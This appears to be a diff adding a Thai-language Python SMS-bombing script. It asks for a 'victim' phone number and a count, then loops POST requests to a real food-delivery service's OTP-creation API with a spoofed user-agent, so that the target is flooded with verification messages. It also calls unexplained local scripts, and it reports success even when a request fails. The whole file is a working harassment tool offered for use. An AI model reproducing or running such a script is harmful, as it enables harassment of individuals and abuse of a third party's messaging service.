@@ -1,0 +1,37 @@
+import requests,time
+import requests,json,time,threading
+import requests,json,time,threading,os,sys
+import urllib.request, os, threading, time, random, sys
+import colorama
+from colorama import Fore, Style, init
+os.system("clear")
+os.system("sh logo")
+print("""
+      \033[1;92mFacebook\033[37;1m : \033[36;1mNaranan Leejaroen
+      \033[1;92mYouTube\033[37;1m  : \033[36;1mNothing YT
+      \033[1;92mVersion\033[37;1m  : \033[36;1m3.0
+""")
+
+ph = input('\033[34;1m[\033[37;1m*\033[34;1m]\033[37;1m ตัวอย่างอันแรก :\033[1;92m 0890000000\n\033[34;1m[\033[37;1m+\033[34;1m]\033[37;1m เบอร์เหยื่อ :\033[33;1m ')
+number = int(input('\033[34;1m[\033[37;1m+\033[34;1m]\033[37;1m จำนวน :\033[36;1m '))
+os.system("python bot5")
+heder = {'Host': 'api2.1112.com',
+'content-length': '44',
+'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko)',
+'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
+}
+
+data = {"phonenumber": f"{ph}","language":"th"}
+
+print("\n\033[32;1m[\033[33;1m🔥shooting sms...\033[32;1m]")
+print("")
+for i in range(number):
+      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
+      if 'eror' in sec.text:
+          print ("\033[33;1m")
+          print(f'{i+1} \033[37;1m[\033[32;1m*\033[37;1m] \033[36;1m[\033[37;1mส่งแล้ว💨\033[36;1m]  \033[32;1m[✔️\033[32;1m]  \033[34;1m'+ ph)
+      else:
+           print ("\033[33;1m")
+           print(f'{i+1} \033[37;1m[\033[32;1m*\033[37;1m] \033[36;1m[\033[37;1mส่งแล้ว💨\033[36;1m]  \033[32;1m[✔️\033[32;1m]  \033[34;1m'+ ph)
+      time.sleep(2.0)
+os.system("python2 ch3")
